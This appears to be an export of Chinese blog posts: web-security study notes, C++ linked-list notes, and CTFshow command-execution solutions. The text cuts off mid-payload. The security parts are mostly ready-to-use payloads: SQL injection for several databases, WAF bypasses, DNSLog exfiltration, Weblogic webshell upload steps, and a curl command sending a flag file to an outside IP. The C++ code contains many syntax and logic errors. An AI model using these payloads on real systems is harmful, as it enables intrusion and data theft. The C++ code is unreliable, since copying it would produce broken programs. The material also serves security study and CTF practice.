%}\n\n\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入流程\n  - 信息收集\n    - 操作系统\n    - 数据库名\n    - 数据库用户\n    - 数据库版本\n    - 其他(网站路径等)\n  - 数据注入:同数据库\n    - 低版本：使用暴力查询或者结合读取查询(MySQL 5.0以下)\n    - 高版本：使用information_schema有据查询(MySQL 5.0以上)\n  - 高权限注入\n    - 常规查询\n    - 跨库查询\n    - 文件读写\n\n{% endpullquote %}\n\nMYSQL数据库\n\n- 网站A---->数据库A\n  - 表A\n    - 列A\n      - 列A数据\n    - 列B\n      - 列B数据\n  - 表B......\n- 网站B---->数据库B......\n\n###### MySQL数据库注入\n\nMySQL 5.0以上自带一个information_schema表记录了所有数据库名,表名,列名的数据库,相当于可以通过它获取指定数据库下面的表名和列名信息\n\ntips:数据库中的“.”符号表示下一级,如user.member就是user库下的menber表\n\ninformation_schema.tables\t记录所有表名信息\n\ninformation_schema.columns\t记录所有列名信息\n\ntable_name\t表名\n\ncolumn_name\t列名\n\n1. **测试是否存在SQL注入**\n\n```\nSELECT * FORM users WHERE id=1 and 1=1 LIMIT 0,1 \n回显正常\nSELECT * FORM users WHERE id=1 and 1=2 LIMIT 0,1\n回显错误\n```\n\n2. **猜测字段数**\n\n```\norder by\t\t\t\t\t\t测试字段数量\nunion select 1,2,3\t判断回显位置\n```\n\n3. **信息收集**\n\n```\n数据库版本:version()\n数据库名:database()\n数据库用户:user()\n操作系统:@@version_compile_os\n```\n\n4. **查询指定数据库下表名,列名,任意数据**\n\n查表名\n\n```\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n```\n\n查列名\n\n```\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name=\"刚刚查出的表名\" and table_schema=\"数据库名\"\n```\n\n查数据\n\n```\nunion select 1,2,group_concat(想查询的列) from 数据库名.表名\n```\n\n**文件读写操作**\n\n目的：getshell\n\n```\nselect load_file('文件位置')\t读取文件\nselect 'X' into outfile 文件位置\n```\n\nmysql 新版本下**secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。**在这个参数之外的位置读取文件会返回NULL\n\n一个load_file小提示：https://blog.csdn.net/weixin_30292843/article/details/99381669\n\n**文件路径的常见获取方法**：\n\n报错显示：通过输入错误内容导致函数执行出错，报错显示出文件路径\n\n遗留文件：phpinfo等\n\n漏洞报错：各种框架的问题\n\n平台配置文件：如apache，nginx，IIS等中间件\n\n爆破等\n\n###### 防注入：\n\n**自带防御：PHP中的魔术引号开关和addslashes()函数**\n\n`magic_quotes_gpc`开关被打开时`（magic_quotes_gpc=ON）`或输入内容被`addslashes`函数处理后时输入数据中含有单引号，双引号，反斜杠与NULL字符，都会被自动加上反斜杠，阻止SQL注入\n\n解决方案：进行16进制编码，MySQL能自动将十六进制转化为字符串执行\n\n**内置函数认证**\n\n没救了\n\n**关键字验证**\n\n可尝试大小写绕过\n\n**WAF防护**\n\n找方法（见上方导图）尝试吧\n\n**SQLMAP** \n\n\n\n## DAY 14 web漏洞 SQL注入 注入类型 提交注入\n\n**提交参数类型：**\n\n数字，字符，搜索，JSON等\n\n**请求方法：**\n\nGET，POST，COOKIE，REQUEST，HTTP HEADER等\n\n**PHP内置变量**\n\n$_GET（GET传参内容）\n\n$_POST（POST传参内容）\n\n$_REUQEST（GET和POST传参内容）\n\n$_SERVER（与服务器有关内容）\n\n\n\n**SQL语句干扰符号，看情况进行闭合或注释**\n\n'，\"，%，)，}等\n\n\n\n**数字型：**无引号包裹\n\n**字符型：**有引号包裹，需要闭合\n\n\n\n## DAY15 web漏洞 SQL注入 Oracle，MongoDB等注入\n\n当注入到一个不熟悉的数据库时，可搜索对应数据库的函数来帮助我们\n\n数据库的用户权限是由连接SQL的配置文件决定的\n\n\n\n**不同数据库的结构**\n\n- **Access**（.mdb文件）\n  - 表名\n    - 列名\n      - 数据\n\n特点：不同数据库是分离的，没啥功能\n\n\n\n- **MySQL，MSSQL等**\n  - 数据库名\n    - 表名\n      - 列名\n        - 数据\n\n\n\n\n\n\n- MSSQL\n\n特点：执行系统命令、读取注册表、读文件、写文件、下载远程文件、导出数据到指定的数据库服务器（能干的事贼多）\n\n\n\n**不同数据库注入命令**\n\n- Access\n\n```\n猜测字段\norder by 3\n获取表名（字典猜）\nunion select 1,2,3 from xxxx\n如果xxxx表存在就会返回数据，没有则空\n获取列名（字典猜）\nunion select 1,xxx,3 from xxxx\n如果xxx列存在就会返回数据，没有则空\n```\n\n- MSSQL\n\n```\n判断数据库类型\nand exists (select count(*) from sysobjects) 返回正常为MSSQL\n判断数据库版本\n有回显：and 1=@@version--\n无回显：and substring((select @@version),22,4)='2008'--无回显，2008即为版本，报错说明不是\n注入点权限判断\nselect is_srvrolemember('sysadmin');  判断当前是否为sa\nselect is_srvrolemember('db_owner');  判断当前用户写文件、读文件的权限（db_owner）\nselect is_srvrolemember('public');  判断是否有public权限，可以爆破表\n```\n\n- PostgreSQL\n\n```\n猜测字段\norder by 3\n获取当前数据库\nunion select null,null,current_database()--\n用户名：user\n用户权限：current_schema()\n会话用户：session_user\n获取表名\nunion select null,string_agg(relname,','),null,null from pg_stat_user_tables\n获取列名\nunion select null,string_agg(column_name,','),null,null from information_schema.columns\n获取数据\nunion select null,string_agg(xxxxx,','),null,null from 表名\n```\n\n- Oracle\n\n```\n猜测字段\norder by 3\n判断字段类型\nunion select null,null,'null' from dual 如果回显正常则说明3位置是数字型，反之则为字符型\n确定回显位置\nunion select 1,2,'3' from dual 假设1,2为数字，3为字符\n获取表名\nunion select 1,(select table_name from user_tables where rownum=1) from dual\nunion select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual 以此类推爆出所有表名\n\n获取列名\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）') from dual\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）' and culumn_name not in ('第一个字段')) from dual 以此类推爆出所有表名\n获取数据\nunion select 1,字段1||字段2||字段3...||字段n from 表名 where rownum=1 -- 在Oracle中group_concat只能联俩\n\n```\n\n- MangoDB：用NoSQLAttack打 \n\n```\n$ne关键字，意味不等于\nMangoDB进行操作时应当先将前面的对象闭合'});return ({\n获取当前数据库\ntitle:tojson(db),xxx:'1\ndb.getCollectionNames()函数获取到的是数组，需要用tojson函数转化为字符串 \n获取所有集合（表）\ntitle:tojson(db.getCollectionNames()),xxx:'1\n获取所有字段\ndb.Authority_confidential为当前使用的表\nfind函数用于查询，[0]为第一条数据\ntitle:tojson(db.Authority_confidential.find()[0])\n```\n\n**SQLMAP，NoSQLAttack，Pangolin**\n\n\n\n\n\n\n\n## DAY16 web漏洞 SQL注入 查询方式 报错盲注\n\n**数据库的查询方式**\n\n```\nselect 查询数据（最常见的）\n在网站中进行数据显示查询的操作\n例：select * from users where id=$id\n\ninsert 插入数据\n在网站中进行用户注册添加等操作\n例：insert into users(id,name,password) values(1,'Jlan','pass')\n\ndelete 删除数据\n后台管理中删除的操作\n例：delete from users where id=$id\n\nupdate 更新数据\n后台管理数据同步或缓存等操作\n例：update user set password='newpass' where id=1 and name='Jlan'\n\norder by 排序数据\n一般结合表名或列名进行数据排序操作\n例： select * from users order by $id\n\n可以通过以上查询方式与网站应用的关系\n通过注入点产生的地方或应用猜到对方的SQL查询方式\n\n```\n\n**盲注**\n\n**内容：**盲注就是在注入过程中，获取的数据不能回显至前端页面，此时我们需要利用一些方法进行判断或尝试，这个过程称为盲注\n\n**分类：**布尔盲注（逻辑判断），时间盲注（延时判断），报错盲注（报错回显）\n\n**常用函数：**\n\nlike 'xxx%'\t判断xxx或xxx...是否成立\n\nregexp '^xxx[a-z]'\t匹配xxx以及xxx...等\n\nif(条件,返回值真,返回值假)\n\nsleep(时间秒)\n\nmid(字符串,起始位置,截取长度)\n\nsubstr(字符串,起始位置,截取长度)\n\nleft(字符串,截取长度)\n\nlength(字符串)\n\nord=ascii\n\nascii(字符)=ascii值\n\n**报错盲注**\n\n常用函数：`floor,updatexml,extractvalue`\n\nextractvalue函数：\n\n语法：`extractvalue(目标xml文档,xml路径)`\n\n报错：当目标xml文档不存在时会返回xml路径\n\n1、通过floor报错,注入语句如下:\n`and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)`\n\n2、通过ExtractValue报错,注入语句如下:\n`and extractvalue(1, concat(0x7e,想查询的内容,0x7e))`\n\n3、通过UpdateXml报错,注入语句如下:\n`and 1=(updatexml(1,concat(0x7e,(select database())),1))`\n\n剩下的可参考这篇文章：https://www.jianshu.com/p/bc35f8dd4f7c\n\n**布尔盲注**\n\n返回页面只有正确与否两种形式，通过if语句以及返回值来得到结果\n\n\n\n\n\n\n\n**时间盲注**\n\n常用函数：`if,sleep`\n\nif函数：\n\n语法：if(条件,返回值真,返回值假)\n\nsleep函数：\n\n语法：sleep(时间（单位为秒）)\n\n用法：~~乖乖用sqlmap啊喂~~\n\n可以先用`length()`判断长度\n\n`and sleep(if(database()='a',5,0))`\n\n**Access偏移注入**\n\n**偏移注入主要是针对知道表，但是不知道字段的。**\n\n~~可以先试试看看源代码中表单的值或者URL特征等~~\n\n```\n首先猜测表：select exists(select * from sys_admin);\n然后爆出字段数：order by x\n然后爆出显示位：union select 1,2,3,4,5....,x from sys_admin\n爆出显示位的基础上依次递减，直到页面恢复正常为止：union select 1,2,3,4,5....,y,* from sys_admin\n最终字段数就等于c=x-2*(x-y)\n一级偏移语句： union select 1,2,3,4,5....c,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)\n```\n\n## DAY17 web漏洞 SQL注入 二次注入 加解密 DNS等注入\n\n**加密解密**\n\n查看抓包内容中是否有加密后的字符串，尝试解密后进行注入时应先进行加密再进行\n\n**二次注入**\n\n在首次进行注册等写入数据库的操作时，将SQL语句写入数据库，在更新数据等操作被执行时，调用出前面构造好的SQL语句导致注入\n\n```\n例子：\n原始语句：\nupdate set password='$new_pass' where username='$user' and password='$current_pass'\n当Jlan正常执行该语句时\nupdate set password='123456' where username='Jlan' and password='000000'\n但是如果有个人尝试二次注入构造出以下用户名\nusername=Jlan'#\n此时这个人尝试更改密码，将会执行下列语句\nupdate set password='123456' where username='Jlan'#' and password='000000'\n#后面的语句全被忽略了，所以真正执行的是下面的语句\nupdate set password='123456' where username='Jlan'\n此时黑客虽然没有拿到Jlan的密码但却成功更改了Jlan的密码，完成二次注入\n```\n\n**DNSLog外带注入**（仅支持Windows）\n\n该方法使用条件\n\n- secure_file_priv **拥有读写权限**\n\n```sql\nsecure_file_priv = \"\"       # 可以读取磁盘目录\nsecure_file_priv = \"D:\\\"    # 可以读取D盘文件\nsecure_file_priv = null     # load_file限制，不能加载文件\n```\n\n- 在mysql 5.5.34 默认为空可以加载文件，之后的版本为NULL，不能加载文件\n\n```\nshow global variables like 'secure%';  //查看是否有写限制\n```\n\n在读写文件条件严苛时，可尝试load_file函数将数据带出\n\n```\nload_file(concat('\\\\\\\\',(想要带出的内容),'.你的URL\\\\kkk'))\n```\n\n此时load_file函数会尝试将访问URL，通过我们构造的URL即可将数据带出\n\n## DAY18 web漏洞 SQL注入 堆叠注入 WAF绕过\n\n**堆叠查询注入**\n\n将多条语句进行执行，使用分割符进行分割，可以直接进行一个数据的插入\n\n限制：只有部分数据库（MySQL）支持堆叠注入\n\n**WAF绕过**\n\n{% pullquote mindmap mindmap-md %}\n\n- WAF绕过\n  - 数据\n    - 大小写\n    - 加密解密\n    - 编码解码\n    - 等价函数\n    - 特殊符号\n    - 反序列化\n    - 注释符混用\n  - 方式\n    - 更改提交方式\n    - 变异\n  - 其他\n    - Fuzz大法\n    - 数据库特性\n    - 垃圾数据已出\n    - HTTP参数污染\n\n{% endpullquote %}\n\n**数据库特性**\n\nMySQL：\n\n```\n/*!50001 语句*/;\n意为只有5.00.01以上版本数据库才会执行\n```\n\n**绕过**\n\n1. ```\n   union#kkk%0Aselect 1,2,3#\n   %0A意为换行符，所以最终执行的语句如下\n   union \n   select 1,2,3#\n   ```\n\n2. IP白名单绕过\n\n   ```\n   构造HTTP请求头\n   \n   \n   ```\n\n3. 访问静态资源（旧版本WAF有效）\n\n   ```\n   /index.php/1.txt/?id=payload\n   ```\n\n4. URL白名单（旧版本WAF有效）\n\n   ```\n   WAF可能对管理页面等不进行拦截，可以尝试插入admin,manage,admin等来尝试匹配绕过\n   /?a=/admin/&id=payload\n   ```\n\n5. 构造爬虫\n\n   ```\n   尝试伪造搜索引擎等爬虫的UA，WAF可能放行\n   ```\n\n\n**HTTP参数污染**\n\n示例：\n\n```\n?id=1/**&id=-1 union select 1,2,3#*/\n当我们使用上面的语句传参时，WAF收到的id参数如下\n1/**&id=-1 union select 1,2,3#*/\n可见我们攻击内容包含在注释中，被WAF忽略，但实际上PHP接收到的参数如下\nid=-1 union select 1,2,3#*/\n成功执行了联合查询\n```\n\n\n\n- Apache+PHP 取后面参数\n- Tmocat+JSP 取前面参数\n- Apache+Perl 取前面参数\n- Apache+Python 取所有参数生成List\n- IIS+ASP 取所有参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY20  web漏洞 文件上传\n\n文件上传漏洞\n\n{% pullquote mindmap mindmap-md %}\n\n- 文件上传漏洞\n  - 验证/绕过\n    - 前端\n      - JS防护\n\n    - 后端\n      - 黑名单\n        - 特殊解析后缀\n        - .htaccess解析\n        - 大小写绕过\n        - 点绕过\n        - 空格绕过\n        - ::$$DATA绕过\n        - 配合解析漏洞\n        - 双后缀名绕过\n\n      - 白名单\n        - MIME绕过\n        - %00截断\n        - 0x00截断\n        - 0x0a截断\n\n      - 内容及其他\n        - 文件头检测\n        - 二次渲染\n        - 条件竞争\n        - 突破getimagesize\n        - 突破exif_imagetype\n\n- 漏洞/修复\n  - 解析漏洞\n    - IIS6/7.x\n    - Apache\n    - Nginx\n\n  - CMS漏洞\n  - 编辑器漏洞\n    - fckeditor\n    - ewebeditor\n    - ckeditor\n    - kindedit\n\n  - CVE等漏洞\n    - CVE-2015-5253\n    - CVE-2017-12615\n    - CVE-2019-2618\n\n- WAF绕过\n  - 安全狗\n  - 宝塔\n  - 云盾\n\n\n{% endpullquote %}\n\n{% pullquote mindmap mindmap-md %}\n\n- 利用思路\n  - 常规\n    - 扫描获取上传\n    - 会员中心上传\n    - 后台系统上传\n    - 各种途径上传\n  - CMS\n    - 已知CMS源码\n  - 编辑器\n    - ckeditor\n    - fckeditor\n    - kindeditor\n    - xxxxeditor\n  - 其他\n    - 代码审计\n    - 平台或第三方应用等\n\n{% endpullquote %}\n\n**nginx解析漏洞**\n\n```\n原理：Nginx拿到文件路径/test.jpg/1.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/1.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Access denied.”。\n\n这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项可帮助“修理”路径，举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。\n\n而在新版本的php中该漏洞可能不成功是因为新的php引入了“security.limit_extensions”，限制可执行文件的后缀，默认只执行.php文件\n```\n\n在上传后的文件中加/xxx.php可尝试解析漏洞\n\n**Weblogic任意文件上传漏洞（CVE-2018-2894）**\n\n[复现链接](https://blog.csdn.net/weixin_43625577/article/details/97001677)\n\n利用条件：Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，**进而获取服务器权限**\n\n影响版本：weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3。\n\n```\n在base_domain中的‘高级’中勾选‘启动Web服务测试页’选项，保存配置\n访问/ws_utc/config.do\n设置Work Home Dir为\n/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css，访问这个目录是无需权限的，这一点很重要。\n然后点击‘安全’——>‘添加’，上传jsp木马\n审查查看时间戳\n访问/ws_utc/css/config/keystore/[时间戳]_[文件名]即可执行webshell\n```\n\n\n\n\n\n**文件上传骚操作**\n\n某些网站在文件上传后不会立刻提交数据包到后端，而是先在本地预览，等用户二次确认后才会将数据进行传输，并且大部分不使用普通的POST文件传输，而是经过加密的字符串，就离谱\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY25 web漏洞 XSS跨站\n\n产生原理\n\n上传了JS代码网页渲染导致的\n\n危害影响\n\n反射型：数据不会被存储到服务器\n\n存储型：数据被存储到数据库\n\nDOM型\n\n生效特点\n\n反射型\n\n提交x——>后端——>执行返回结果\n\n存储型\n\n提交x——>后端存储——>取出数据——>执行结果\n\nDOM型\n\n提交x——>本地浏览器静态前端代码执行——>被提交到后端执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"数据结构","url":"/posts/1106.html","content":"\n# 数据结构\n\n## 线性结构\n\n### 线性表顺序结构实现\n\n<!--more-->\n\n```C++\n//数组静态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType data[MaxSize];\n\tint length;\n}SqList;\n\n//数组动态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType *data;\n\tint length\n}SqList;\nSqList L;\nL.data=(ElementType*)malloc(sizeof(ElementType)*MaxSize);\n//#include <cstdlib>\n//malloc(m)函数，开辟m字节长度的地址空间，并返回这段空间的首地址\n//sizeof(x)运算，计算变量x的长度\n//free(p)函数，释放指针p所指变量的存储空间，彻底删除一个变量\n//typedef type name 定义种类为type的变量种类\n\n\n//各种功能实现\n//函数结果状态代码\n#define TRUE 1\n#define FALSE 0\n#define OK 1\n#define ERROR 1\n#define INFEASIBLE -1\n#define OVERFLOW -2\n//Status是所有函数的类型，值是函数结果状态代码\ntypedef int Status;\n\n//线性表初始化\nStatus InitList(SqList &L){\n  L.data=new ElementType[MAXSIZE];\n  if(!L.data)\n    exit(OVERFLOW);//内存开辟失败\n  L.length=0;\n  return OK;\n}\nvoid DestoryList(SqList &L){\n  if(L.data)\n    delete L.data;\n}\nvoid ClearList(SqList &L){\n  L.length=0;\n}\nint GetLength(SqList L){\n\treturn L.length;  \n}\nbool IsEmpty(SqList L){\n  if(L.length==0)\n    return true;\n  return false;\n}\nint GetElement(SqList L,int i,ElementType &e){\n\tif(i>=1&&i<=L.length){\n    e=L.data[i-1];\n    return OK;\n  }\n  return ERROR;\n}\nint FindElementByNum(SqList L,int num){\n  for(int i=0;i<L.length;i++){\n    if(L.data[i]==num){\n      return i+1;\n    }\n  }\n  return 0;\n}\nStatus Insert(SqList &L,int i,ElementType e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  if(L.length==MAXSIZE)\n    return ERROR;\n  for(int j=L.length-1;j>=i-1;j--){\n    L.data[j+1]=L.data[j];\n  }\n  L.data[i-1]=e;\n  L.length++;\n  return OK;\n}\nStatus Delete(SqList &L,int i,ElementType &e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  e=L.data[i-1]\n  for(int j=L.length-1;i<=j;i++){\n    L.data[i-1]=L.data[i];\n  }\n  L.length--;\n  return OK;\n}\n```\n\n### 线性表链式结构实现\n\n```C++\ntypedef struct{\n\tint num;\n  char name[10];\n  int score;\n}ElementType;\ntypedef struct Lnode{\n\tElementType data;\n\tstruct Lnode *next;\n}Lnode,*LinkList;\nLinkList L;<==>LNode *p\nStatus InitList(LinkList &L){\n  L=new LNode;\n  L->next=NULL;\n  return OK;\n}\nbool IsEmpty(LinkList L){\n  if(L->next==NULL)\n  \treturn 1;\n  return 0;\n}\nStatus DestoryList(LinkList &L){\n  LNode *p;\n  while(L!=NULL){\n    p=L;\n    L=L->next;\n    delete p;\n  }\n  return OK;\n}\nStatus ClearList(LinkList &L){\n  LNode *p,*q;\n  p=L->next;\n  while(L!=NULL){\n    q=p->next;\n    delete p;\n    p=q;\n  }\n  L->next=NULL;\n  return OK;\n}\nint ListLength(LinkList L){\n  int i=0;\n  LinkList p=L->next;\n  while(p!=NULL){\n    i++;\n    p=p->next;\n  }\n  return i;\n}\nint GetElement(LinkList L,int i,ElementType &e){\n\tif(i<1||i>L.length)\n    return ERROR;\n  LinkList p=L;\n  for(int j=1;j<=i;j++){\n    p=p->next;\n  }\n  e=p->data;\n  return OK;\n}\n*LNode FindElementGetAddress(LinkList L,ElementType e){\n  LinkList p=L->next;\n  while(p&&p->data!=e){\n    p=p->next;\n  }\n  return p;\n}\nint FindElementGetNum(LinkList L,ElementType e){\n  LinkList p=L->next;\n  int j=1;\n  whlie(p&&p->data!=e){\n    p=p->next;\n    j++;\n  }\n  if(p)\n    return j;\n  return 0\n}\nStatus Insert(LinkList &L,int i,ElementType e){\n  LinkList p=L;\n  LinkList s;\n  int j=1\n  s->data=e;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!p)\n    return ERROR;\n  LinkList s->next=p->next;\n  p->next=s;\n  return OK;\n}\nStatus Delete(LinkList &L,int i,ElementType &e){\n  LinkList p=L,s;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!(p->next)||j>i-1)\n    return ERROE\n  s=p->next;\n  p->next=s->next;\n  e=s->data\n  delete s;\n  return OK\n}\n//单链表建立方法：头插法\n//1、建立一个空表，重复读入数据\n//2、生成新节点，将读入数据存放到新节点的数据域中\n//3、从最后一个节点开始，依次将各节点插入到链表的前端\nL=new LNode;\np=new LNode;\np->data=a;\np->next=L->next;\nL->next=p;\n  \n//单链表建立方法：头插法\n    \nvoid CreateList_R(LinkList &L,int n){\n\tL=new LNode;\n  L->next=NULL;\n  r=L;\n  for(int i=0;i<n;i++){\n    p=new LNode;\n    cin>>p->data;\n    p->next=NULL;\n    r->next=p;\n    r=p;\n  }\n}\np->data=a;\np->next=NULL;\nr->next=p;//尾指针\nr=p\n    \n//循环链表\n//好处：从表中任意阶段出发均可找到表中其他节点\nLinkList Connect(LinkList &a,LinkList &b){\n  LinkList p=a->next;\n  a->next=b->next->next\n  delete b->next;\n  b->next=p;\n  return b;\n}\n//双向链表\ntypedef struct DuLNode{\n  ElementType data;\n  struct DuLNode *prior,*next;\n}DuLNode,*DuLinkList;\n    \n//线性表合并\nvoid Union(List &La,List Lb){\n  La_len=ListLength(La);\n  Lb_len=ListLength(Lb);\n  for(int i=1;i<=Lb_len;i++){\n    LNode e;\n    GetElement(Lb,i,e);\n    if(!FindElement(La,e))\n    \tInsert(&La,++La_len,e);\n  }\n}\n//有序表合并\nvoid Union(LinkList &La,LinkList &Lb,LinkList &Lc){\n  pa=La->next;\n  pb=Lb->next;\n  pc=Lc=La;\n  while(pa&&pb){\n    if(pa->data<=pb->data){\n      pc->next=pa;\n      pc=pa;\n      pa=pa->next;\n    }\n    else{\n      pc->next=pb;\n      pc=pb;\n      pb=pb->next;\n    }\n    pc->next=pa?pa:pb;\n    delete Lb;\n  }\n}\n    \n    \n    \n  \n    \n    \n    \n    \n    \n    \n    \n    \n  \n  \n  \n  \n  \n  \n\n\n\n```\n\n### 栈和队列\n\n```C++\n//栈只能在表尾进行插入和删除\n//队列只能在表尾插入，表头删除\n```\n\n","tags":["C++"]},{"title":"CTFshow命令执行","url":"/posts/47520.html","content":"\n# 命令执行\n\n危险函数：\n\n```\n------------------------------------------------执行(系统)函数\n\t eval\n\t exec - 执行一个外部程序\n\t shell_exec\n\t system\n\t passthru\n\t proc_open\n\t pcntl_exec — 在当前进程空间执行指定程序\n\t pcntl_fork  在当前进程当前位置产生分支（子进程）。\n\t dl — 运行时载入一个 PHP 扩展\n\t unserialize - 反序列化一个类函数nashell\n\t ------------------------------------------------显示源码   \n\t phpinfo\n\t readfile\n\t readline\n\t show_source\n\t heighlight\n\t heighlight_string\n\t curl\n\t php\n   curl -f filename=@/flag [要传到的ip地址和端口]\t\n\t 解释：在linux里面单引号里面的的命令会直接先执行\n\t 以上的curl -f命令会把@后面文件名对应的文件传输到指定的ip端口地址\n\t 所以会直接执行curl命令将得到的flag文件传输到指定id端口，不需要管ping\t  命令了只要监听此端口拿到文件即可\n\t file \n\t ------------------------------------------------回调函数\n\t array_walk\n\t array_walk_recursive\n\t array_map\n\t call_user_func_array\n\t call_user_func\n\t ------------------------------------------------数组使用回调函数过滤\n\t array_filter\n\t filter_var\n\t filter_var_array\n\t ------------------------------------------------写入文件\n\t fopen\n\t fwrite\n\t file_put_contents - 将数据写入文件中\n\t file-get-contents - 获取参数的文件资源\n\t move_uploaded_file - 将上传的文件移动到新位置\n\t ------------------------------------------------命令字符串转义\n\t escapeshellcmd - 对特殊字符转义\n\t escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数\n\t ------------------------------------------------其他\n\t proc_terminate — 杀除由 proc_open 打开的进程\n\t touch - 设定文件的访问和修改时间\n```\n\n可用于执行php函数的函数：\n\n```\neval()、assert()、preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//正则规则中含有/e修饰符就存在代码执行漏洞\ncreate_function()\n```\n\n可用于执行系统命令的函数：\n\n```php\nexec()//返回命令执行结果，加echo\npassthru()//执行后直接显示结果\nsystem()//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false\nshell_exec()//返回命令执行结果，加echo\n`命令`//返回命令执行结果，加echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\n可用于替代空格的字符：\n\n```\n%09、$IFS$9、 ${IFS}、$IFS%09、< 、<>、%20等\n```\n\n可用于读取文件的命令：\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\nls / | tee 1.txt\n将ls后的结果写入1.txt中\n```\n\n通配符：\n\n```\n*代表任意位\n?代表一位\n```\n\n**取反绕过**\n\n原理：php字符串取反之后可绕过正则\n\n```php\n<?php\n\t$s='phpinfo';\n\techo urlencode(~$s);\n\t//%8F%97%8F%96%91%99%90\n?>\n```\n\n这时传入`a=(~%8F%97%8F%96%91%99%90)();`\n\n即可执行phpinfo函数\n\n对于PHP，形如 `(func_name)()`，其中func_name可以是字符串，会执行这个func\n\n但是如果只传入`(~%8F%97%8F%96%91%99%90%D7%D6)`内容为`phpinfo()`，会发现此时函数不会被执行，此时php取反取得了phpinfo，但是取反得到的字符串 `phpinfo()`并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 `phpinfo()`\n\n所以如果我们想执行shell，是不能单传入一个`$_POST['kkk']`的取反来执行的，而是需要使用嵌套执行的方式，形如`assert($_POST[kkk])`传入`(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%94%94%94%A2)`再传入命令kkk来执行\n\n\n\n\n\n\n\n\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag，使用通配符绕过，f*代表匹配所有以f开头的文件，\\`内部为执行的命令，通过echo得到返回值\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag,system,php，同上\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格，使用%09将空格替代即可\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号，可以使用文件包含函数`include()`，include可以实现无括号包含，进而通过`?>`将整个PHP代码闭合即可绕过分号，而后就能做到参数逃逸（因为代码中只检测了c中传入的内容），进而通过传入参数通过php伪协议读取内容\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号，同上\n\n##### 34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号，同上\n\n##### 35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号，同上\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号,数字，将get参数中的数字改为字母即可\n\n##### 37\n\n```\npayload:?c=php://input\n请求体:<?php include \"flag.php\"?>\n或\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\ninclude函数开始，过滤了flag，通过php://input伪协议直接包含文件\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\n过滤了flag, php,file，通过data伪协议执行include \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat 